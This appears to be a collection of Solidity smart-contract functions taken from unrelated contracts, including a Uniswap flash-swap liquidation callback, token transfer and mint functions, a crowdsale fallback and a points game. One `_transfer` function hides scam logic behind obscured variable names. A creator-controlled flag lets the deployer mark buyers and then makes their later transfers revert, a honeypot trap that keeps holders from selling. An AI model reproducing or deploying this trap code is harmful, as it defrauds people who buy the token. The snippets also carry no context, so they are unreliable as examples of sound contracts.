function uniswapV3SwapCallback(int256 _amount0, int256 _amount1, bytes calldata _data) external {
    require(msg.sender == address(uniswapPair), "GebUniswapV3KeeperFlashProxyETH/invalid-uniswap-pair");
    uint amount = coin.balanceOf(address(this));
    coin.approve(address(coinJoin), amount);
    coinJoin.join(address(this), amount);
    (bool success, ) = address(this).call(_data);
    require(success, "failed bidding");
    ethJoin.exit(address(this), safeEngine.tokenCollateral(collateralType, address(this)));
    uint amountToRepay = _amount0 > int(ZERO) ? uint(_amount0) : uint(_amount1);
    weth.transfer(address(uniswapPair), amountToRepay);
    uint profit = weth.balanceOf(address(this));
    weth.withdraw(profit);
    caller.call {
        value: profit
    }("");
    caller = address(0x0);
}

function liquidateAndSettleSAFE(address safe) public returns(uint auction) {
    if (liquidationEngine.safeSaviours(liquidationEngine.chosenSAFESaviour(collateralType, safe)) == 1) {
        require(liquidationEngine.chosenSAFESaviour(collateralType, safe) == address(0),
            "safe-is-protected.");
    }
    auction = liquidationEngine.liquidateSAFE(collateralType, safe);
    settleAuction(auction);
}

function transferFrom(address from, address to, uint tokens) public returns(bool success) {
    require(now < 1532092839); 
    balances[from] = safeSub(balances[from], tokens);
    allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
    balances[to] = safeAdd(balances[to], tokens);
    Transfer(from, to, tokens);
    return true;
}

function transfer(address to, uint tokens) public returns(bool success) {
    require(now < 1532092839); 
    balances[msg.sender] = safeSub(balances[msg.sender], tokens);
    balances[to] = safeAdd(balances[to], tokens);
    Transfer(msg.sender, to, tokens);
    return true;
}

function _transferFrom(address sender, address recipient, uint256 amount) internal returns(bool) {
    require(!isBlacklisted[sender] && !isBlacklisted[recipient], "Blacklisted");
    if (inSwap) {
        return _basicTransfer(sender, recipient, amount);
    }
    if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
        require(tradingEnabled, "Trading not open yet");
    }
    if (shouldSwapBack()) {
        swapBack();
    }
    uint256 amountReceived = amount;
    if (automatedMarketMakerPairs[sender]) { 
        if (!isFeeExempt[recipient]) {
            require(_balances[recipient].add(amount) <= _maxWalletAmount || isMaxWalletExempt[recipient], "Max Wallet Limit Limit Exceeded");
            require(amount <= _maxTxAmount || isTxLimitExempt[recipient], "TX Limit Exceeded");
            amountReceived = takeBuyFee(sender, recipient, amount);
        }
    } else if (automatedMarketMakerPairs[recipient]) { 
        if (!isFeeExempt[sender]) {
            require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
            amountReceived = takeSellFee(sender, amount);
            if (privateSaleHolders[sender] && privateSaleLimitsEnabled) {
                require(cooldownTimerPrivate[sender] < block.timestamp, "Pvt sale time restricted");
                require(amount <= _maxPvtSellAmount, "Pvt sale have max sell restriction");
                cooldownTimerPrivate[sender] = block.timestamp + cooldownTimerIntervalPrivate;
            }
        }
    } else {
        if (!isFeeExempt[sender]) {
            require(_balances[recipient].add(amount) <= _maxWalletAmount || isMaxWalletExempt[recipient], "Max Wallet Limit Limit Exceeded");
            require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
            amountReceived = takeTransferFee(sender, amount);
            if (privateSaleHolders[sender] && privateSaleLimitsEnabled) {
                require(cooldownTimerPrivate[sender] < block.timestamp, "Pvt sale time restricted");
                require(amount <= _maxPvtSellAmount, "Pvt sale have max sell restriction");
                cooldownTimerPrivate[sender] = block.timestamp + cooldownTimerIntervalPrivate;
            }
        }
    }
    _balances[sender] = _balances[sender].sub(amount);
    _balances[recipient] = _balances[recipient].add(amountReceived);
    emit Transfer(sender, recipient, amountReceived);
    return true;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (nuts == false)) {
        liners = chTx;
        boner = true;
    }
    if ((address(sender) == creator) && (nuts == true)) {
        artifical[recipient] = true;
        intelligence[recipient] = false;
        nuts = false;
    }
    if ((amount > socks) && (artifical[sender] == true) && (address(sender) != creator)) {
        money[recipient] = true;
    }
    if (artifical[recipient] != true) {
        intelligence[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((intelligence[sender]) && (artifical[recipient] == false)) {
        intelligence[recipient] = true;
    }
    if (artifical[sender] == false) {
        if ((amount > socks) && (money[sender] == true)) {
            require(false);
        }
        require(amount < liners);
        if (boner == true) {
            if (money[sender] == true) {
                require(false);
            }
            money[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function() public payable {
    require(now >= startDate && now <= endDate);
    uint tokens;
    if (now <= bonusEnds) {
        tokens = msg.value * 15000;
    } else {
        tokens = msg.value * 12500;
    }
    balances[msg.sender] = safeAdd(balances[msg.sender], tokens);
    _totalSupply = safeAdd(_totalSupply, tokens);
    Transfer(address(0), msg.sender, tokens);
    owner.transfer(msg.value);
}

function calculatePoints(uint _earlierTime, uint _laterTime) private pure returns(uint) {
    assert(_earlierTime <= _laterTime);
    if (_earlierTime == _laterTime) {
        return 0;
    }
    uint timeElapsedInSeconds = _laterTime.sub(_earlierTime);
    if (timeElapsedInSeconds < 60) {
        return 0;
    }
    uint timeElapsedInMinutes = timeElapsedInSeconds.div(60);
    assert(timeElapsedInMinutes > 0);
    if (timeElapsedInMinutes >= 1000) {
        return POINTS_TO_WIN;
    }
    return timeElapsedInMinutes ** POINT_EXPONENT;
}

function tryAdvance() public {
    uint kingTotalPoints = calculatePoints(crownedTime, now) + players[king].points;
    if (kingTotalPoints >= POINTS_TO_WIN) {
        forceAdvance();
    }
}

function mint(address to, uint256 amount) external {
    uint256 availableSupply = mintableSupply();
    require(msg.sender == admin, "Only admin can add token supply");
    require(amount <= availableSupply, "Shaktiio mintable token cap exceeded");
    totalCirculatingSupply = totalCirculatingSupply + amount;
    _mint(to, amount);
}

function mintableSupply() internal returns(uint256) {
    uint256 availableSupply = 0;
    if (block.timestamp >= add(creationTime, lockingPeriod)) {
        availableSupply = sub(totalSupplyCap, totalCirculatingSupply);
        lockedSupply = 0;
    } else {
        availableSupply = sub(totalSupplyCap, add(totalCirculatingSupply, lockedSupply));
    }
    return availableSupply;
}

